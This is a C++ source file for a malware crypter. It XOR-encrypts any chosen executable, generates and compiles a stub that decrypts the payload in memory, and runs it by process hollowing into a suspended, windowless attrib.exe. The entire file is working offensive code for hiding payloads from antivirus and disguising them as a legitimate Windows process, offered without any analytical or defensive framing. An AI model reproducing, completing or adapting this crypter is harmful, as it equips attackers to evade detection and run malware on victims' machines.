#include <iostream>
#include <vector>
#include <fstream>
#include <random>
#include <windows.h>

// Helper function to read a file into a vector
std::vector<unsigned char> readFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Could not open file: " + filename);
    }
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// Helper function to write a vector to a file
void writeFile(const std::string& filename, const std::vector<unsigned char>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Could not write to file: " + filename);
    }
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// XOR encryption/decryption function
std::vector<unsigned char> xorEncryptDecrypt(const std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    std::vector<unsigned char> result(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Function to create the stub with the encrypted payload
void createStub(const std::vector<unsigned char>& encryptedPayload, const std::vector<unsigned char>& key) {
    std::ofstream stubFile("stub.cpp");

    // Write the stub code with the encrypted payload and decryption function
    stubFile << R"(
#include <iostream>
#include <vector>
#include <windows.h>

// Encrypted payload
const std::vector<unsigned char> encryptedPayload = {)";
    for (size_t i = 0; i < encryptedPayload.size(); ++i) {
        stubFile << static_cast<int>(encryptedPayload[i]);
        if (i != encryptedPayload.size() - 1) {
            stubFile << ", ";
        }
    }
    stubFile << R"(};

// XOR key
const std::vector<unsigned char> key = {)";
    for (size_t i = 0; i < key.size(); ++i) {
        stubFile << static_cast<int>(key[i]);
        if (i != key.size() - 1) {
            stubFile << ", ";
        }
    }
    stubFile << R"(};

// XOR decryption function
std::vector<unsigned char> xorDecrypt(const std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    std::vector<unsigned char> decryptedData(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        decryptedData[i] = data[i] ^ key[i % key.size()];
    }
    return decryptedData;
}


int RunPortableExecutable(void* Image)
{
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    CONTEXT CTX;
    DWORD64 ImageBase;
    void* pImageBase;

    int count;

    ZeroMemory(&CTX, sizeof(CTX));

    DOSHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(Image);
    NtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(reinterpret_cast<DWORD_PTR>(Image) + DOSHeader->e_lfanew);

    if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        std::cerr << "Invalid NT Signature" << std::endl;
        return 0;
    }

    ZeroMemory(&PI, sizeof(PI));
    ZeroMemory(&SI, sizeof(SI));
    SI.cb = sizeof(SI);

    if (!CreateProcessA("C:\\WINDOWS\\System32\\attrib.exe", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
    {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return 0;
    }

    CTX.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(PI.hThread, &CTX))
    {
        std::cerr << "GetThreadContext failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    if (!ReadProcessMemory(PI.hProcess, reinterpret_cast<LPCVOID>(CTX.Rdx + 0x10), &ImageBase, sizeof(ImageBase), NULL))
    {
        std::cerr << "ReadProcessMemory failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    pImageBase = VirtualAllocEx(PI.hProcess, reinterpret_cast<LPVOID>(NtHeader->OptionalHeader.ImageBase),
        NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pImageBase == nullptr)
    {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    if (!WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL))
    {
        std::cerr << "WriteProcessMemory (headers) failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
    {
        SectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<DWORD_PTR>(Image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (count * sizeof(IMAGE_SECTION_HEADER)));

        if (!WriteProcessMemory(PI.hProcess, reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(pImageBase) + SectionHeader->VirtualAddress),
            reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL))
        {
            std::cerr << "WriteProcessMemory (sections) failed: " << GetLastError() << std::endl;
            TerminateProcess(PI.hProcess, 0);
            return 0;
        }
    }

    if (!WriteProcessMemory(PI.hProcess, reinterpret_cast<LPVOID>(CTX.Rdx + 0x10),
        &NtHeader->OptionalHeader.ImageBase, sizeof(NtHeader->OptionalHeader.ImageBase), NULL))
    {
        std::cerr << "WriteProcessMemory (ImageBase) failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    CTX.Rip = reinterpret_cast<DWORD_PTR>(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(PI.hThread, &CTX))
    {
        std::cerr << "SetThreadContext failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    if (ResumeThread(PI.hThread) == (DWORD)-1)
    {
        std::cerr << "ResumeThread failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    WaitForSingleObject(PI.hProcess, INFINITE);

    CloseHandle(PI.hThread);
    CloseHandle(PI.hProcess);

    return 1;
}

// Function to decrypt and execute the payload in memory
void decryptAndExecute() {
    std::vector<unsigned char> decryptedPayload = xorDecrypt(encryptedPayload, key);

    // Allocate memory for the decrypted payload
    void* exec = VirtualAlloc(0, decryptedPayload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == nullptr) {
        std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
        return;
    }

    // Copy the decrypted payload to the allocated memory
    std::memcpy(exec, decryptedPayload.data(), decryptedPayload.size());


    RunPortableExecutable(exec);


    // Free the allocated memory
    VirtualFree(exec, 0, MEM_RELEASE);
}

int main()
{
    decryptAndExecute();
})";

    // Close the stub file
    stubFile.close();
}

int main() {
    try {
        // Read the executable file
        std::string filename;
        std::cout << "Enter the filename of the executable to encrypt: ";
        std::cin >> filename;
        std::vector<unsigned char> payload = readFile(filename);

        // Generate a random key
        std::vector<unsigned char> key(16);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (size_t i = 0; i < key.size(); ++i) {
            key[i] = dis(gen);
        }

        // Encrypt the payload
        std::vector<unsigned char> encryptedPayload = xorEncryptDecrypt(payload, key);
        std::cout << "Payload encrypted successfully." << std::endl;

        // Write the encrypted payload to a file
        std::string outputFile = "encrypted_payload.bin";
        writeFile(outputFile, encryptedPayload);
        std::cout << "Encrypted payload saved to '" << outputFile << "'." << std::endl;

        // Create the stub with the encrypted payload
        createStub(encryptedPayload, key);
        std::cout << "Stub created successfully." << std::endl;

        // Compile the stub
        std::string compileCommand = "cl /EHsc stub.cpp";
        std::cout << "Compiling stub with command: " << compileCommand << std::endl;
        int compileResult = std::system(compileCommand.c_str());
        if (compileResult != 0) {
            throw std::runtime_error("Stub compilation failed.");
        }

        // Execute the compiled stub
        std::cout << "Executing compiled stub..." << std::endl;
        int executeResult = std::system("stub.exe");
        if (executeResult != 0) {
            throw std::runtime_error("Stub execution failed.");
        }
        std::cout << "Stub executed successfully." << std::endl;
    }
    catch (const std::exception& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
    }

    return 0;
}
